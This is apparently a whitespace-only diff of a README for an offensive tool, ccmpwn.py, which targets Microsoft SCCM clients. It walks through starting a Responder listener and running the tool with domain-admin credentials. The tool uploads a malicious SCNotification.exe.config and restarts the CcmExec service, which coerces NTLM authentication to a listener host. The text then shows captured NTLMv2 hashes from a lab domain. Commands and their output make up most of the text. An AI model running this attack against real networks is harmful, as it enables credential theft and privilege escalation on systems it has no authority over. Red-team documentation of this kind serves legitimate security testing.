@@ -42,32 +42,32 @@ First, setup a listener such as Responder or ntlmrelayx. Here we use Responder:
 
 <...SNIP...>
 
-[+] Listening for events...    
+[+] Listening for events...
 ```
 
 Next, run `ccmpwn.py` with administrative credentials:
 ```
 ┌──(impacket)─(kali㉿SCCM1-kali)-[~/impacket/ccmpwn]
 └─$ python3 ccmpwn.py ludus/domainadmin:'password'@10.2.10.11 coerce -computer 10.2.10.99 -method smb
-____ ____ _  _ ___  _ _ _ _  _                                                                                                                                                                                                                         
-|    |    |\/| |__] | | | |\ |                                                                                                                                                                                                                         
-|___ |___ |  | |    |_|_| | \|                                                                                                                                                                                                                                        
-v1.0.0                                                                                                                                                               
+____ ____ _  _ ___  _ _ _ _  _
+|    |    |\/| |__] | | | |\ |
+|___ |___ |  | |    |_|_| | \|
+v1.0.0
 [*] Downloading original SCNotification.exe.config via SMB
 [*] Uploading malicious SCNotification.exe.config via SMB
 [*] Stopping CcmExec service. Waiting 20 seconds to restart service.
 [*] Starting CcmExec service. Wait around 30 seconds for SCNotification.exe to run config file.
-[*] Cleaning up SCNotification.exe.config     
+[*] Cleaning up SCNotification.exe.config
 ```
 
 Now wait for `ccmpwn.py` to restart the service and capture/relay the incoming NTLM authentication:
 ```
 [SMB] NTLMv2-SSP Client   : 10.2.10.11
 [SMB] NTLMv2-SSP Username : ludus\domainadmin
-[SMB] NTLMv2-SSP Hash     : domainadmin::ludus:03489dd2ad202a57:6EFA74B3414AD598D2A8EADB735C48CD:01010000000<...SNIP...>030002E0032002E00310030002E00390039000000000000000000                    
+[SMB] NTLMv2-SSP Hash     : domainadmin::ludus:03489dd2ad202a57:6EFA74B3414AD598D2A8EADB735C48CD:01010000000<...SNIP...>030002E0032002E00310030002E00390039000000000000000000
 [SMB] NTLMv2-SSP Client   : 10.2.10.11
 [SMB] NTLMv2-SSP Username : ludus\domainuser
-[SMB] NTLMv2-SSP Hash     : domainuser::ludus:5faf4f644ffb9899:5CF9B8944938B83B6BF5BF13019D53B1:010100000000<...SNIP...>030002E0032002E00310030002E00390039000000000000000000   
+[SMB] NTLMv2-SSP Hash     : domainuser::ludus:5faf4f644ffb9899:5CF9B8944938B83B6BF5BF13019D53B1:010100000000<...SNIP...>030002E0032002E00310030002E00390039000000000000000000
 ```
 
 ## References
